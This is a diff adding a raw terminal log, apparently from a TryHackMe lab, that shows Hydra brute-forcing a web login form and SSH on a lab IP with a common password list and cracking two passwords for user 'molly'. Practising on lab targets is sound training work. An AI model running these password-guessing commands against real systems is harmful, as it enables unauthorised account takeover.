@@ -1,0 +1,24 @@
+$ hydra -l molly -P /usr/share/seclists/Passwords/probable-v2-top1575.txt 10.10.234.167 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" 
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-13 11:34:23
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1575 login tries (l:1/p:1575), ~99 tries per task
+[DATA] attacking http-post-form://10.10.234.167:80/login:username=^USER^&password=^PASS^:incorrect
+[80][http-post-form] host: 10.10.234.167   login: molly   password: sunshine
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-13 11:34:25
+user@kali:~/tryhackme/hydrachallenge$ hydra -l molly -P /usr/share/seclists/Passwords/probable-v2-top1575.txt 10.10.234.167 ssh
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-13 11:35:19
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1575 login tries (l:1/p:1575), ~99 tries per task
+[DATA] attacking ssh://10.10.234.167:22/
+[STATUS] 179.00 tries/min, 179 tries in 00:01h, 1399 to do in 00:08h, 16 active
+[22][ssh] host: 10.10.234.167   login: molly   password: butterfly
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-13 11:36:52
+
